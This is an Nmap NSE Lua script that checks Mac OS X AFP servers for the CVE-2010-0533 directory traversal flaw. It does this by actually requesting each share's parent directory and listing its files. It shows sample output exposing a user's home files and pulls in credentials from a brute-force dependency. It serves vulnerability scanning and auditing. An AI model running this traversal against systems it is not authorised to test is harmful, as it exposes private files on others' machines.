description = [[ 
Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.

This script attempts to iterate over all AFP shares on the remote
host. For each share it attempts to access the parent directory by
exploiting the directory traversal vulnerability as described in
CVE-2010-0533.

The script reports whether the system is vulnerable or not. In
addition it lists the contents of the parent and child directories to
a max depth of 2.
When running in verbose mode, all items in the listed directories are
shown.  In non verbose mode, output is limited to the first 5 items.
If the server is not vulnerable, the script will not return any
information.

For additional information:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0533
* http://www.cqure.net/wp/2010/03/detecting-apple-mac-os-x-afp-vulnerability-cve-2010-0533-with-nmap
* http://support.apple.com/kb/HT1222
]]

---
--
--@output
-- PORT    STATE SERVICE
-- 548/tcp open  afp
-- | afp-path-vuln:  
-- |   Patrik Karlsson's Public Folder/../ (5 first items)
-- |     .bash_history
-- |     .bash_profile
-- |     .CFUserTextEncoding
-- |     .config/
-- |     .crash_report_checksum
-- |   
-- |_AFP path traversal (CVE-2010-0533): VULNERABLE
--

--
-- Version 0.3
--
-- Created 02/09/2010 - v0.1 - created by Patrik Karlsson as PoC for Apple
-- Revised 05/03/2010 - v0.2 - cleaned up and added dependency to afp-brute and added support 
--                             for credentials by argument or registry
-- Revised 10/03/2010 - v0.3 - combined afp-path-exploit and afp-path-vuln into this script

author = "Patrik Karlsson"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

require 'shortport'
require 'stdnse'
require 'afp'

dependencies = {"afp-brute"}

portrule = shortport.portnumber(548, "tcp")

--- This function processes the table returned by the Dir method of the Helper class
--
-- @param tbl table containing the table as return from the Dir method
-- @param max_count number containing the maximum items to return
-- @param out table used when called recursively should be nil on first call
-- @param count number with total amount of entries so far, nil at first call
-- @return table suitable for stdnse.format_output
local function processResponse( tbl, max_count, out, count )

	local out = out or {}
	local count = count or 0

	for _, v in ipairs(tbl) do
		if ( max_count and max_count > 0 and max_count <= count ) then
			break
		end
		if ( v.name ) then
			local sfx = ( v.type == 0x80 ) and "/" or ""
			table.insert(out, v.name .. sfx )
			count = count + 1
		elseif( type(v) == 'table' ) then
			local tmp = {}
			table.insert( out, tmp )
			processResponse( v, max_count, tmp, count ) 
		end
	end
	
	-- strip the outer table
	return out[1]
end

--- This function simply checks if the table contains a Directory Id (DID) of 2
-- The DID of the AFP sharepoint is always 2, but no child should have this DID
--
-- @param tbl table containing the table as return from the Dir method
-- @return true if host is vulnerable, false otherwise
local function isVulnerable( tbl )
	for _, v in ipairs(tbl) do
		-- if we got no v.id it's probably a container table
		if ( not(v.id) ) then
			if ( isVulnerable(v) ) then
				return true
			end
		end
		if ( v.id == 2 ) then
			return true
		end
	end
	return false
end

action = function(host, port)

	local status, response, shares
	local result = {}
	local afp_helper = afp.Helper:new()
	local args = nmap.registry.args
	local users = nmap.registry.afp or { ['nil'] = 'nil' }
	local vulnerable = false

	local MAX_FILES = 5

	if ( args['afp.username'] ) then
		users = {}
		users[args['afp.username']] = args['afp.password']
	end	

	for username, password in pairs(users) do

		status, response = afp_helper:OpenSession(host, port)
		if ( not(status) ) then
			stdnse.print_debug(response)
			return
		end

		-- Attempt to use No User Authentication?
		if ( username ~= 'nil' ) then
			status, response = afp_helper:Login(username, password)
		else
			status, response = afp_helper:Login(nil, nil)
		end
		if ( not(status) ) then
			stdnse.print_debug("afp-path-vuln: Login failed", response)
			stdnse.print_debug(3, "afp-path-vuln: Login error: %s", response)
			return
		end

		status, shares = afp_helper:ListShares()

		for _, share in ipairs(shares) do
					
			local status, response = afp_helper:Dir( share .. "/../", { max_depth = 2 } )

			if ( not(status) ) then
				stdnse.print_debug(3, "afp-path-vuln: %s", response)
			else
				if ( isVulnerable( response ) ) then
					vulnerable = true
					if(nmap.verbosity() > 1) then
						response = processResponse( response )
						response.name = share .. "/../"
					else
						response = processResponse( response, MAX_FILES )
						response.name = share .. ("/../ (%d first items)"):format(MAX_FILES)
					end
					table.insert(result, response)
				end
			end
		end
	end
	
	if ( vulnerable ) then
		table.insert(result, "\n\nAFP path traversal (CVE-2010-0533): VULNERABLE")
	end

	return stdnse.format_output(true, result)			
	
end
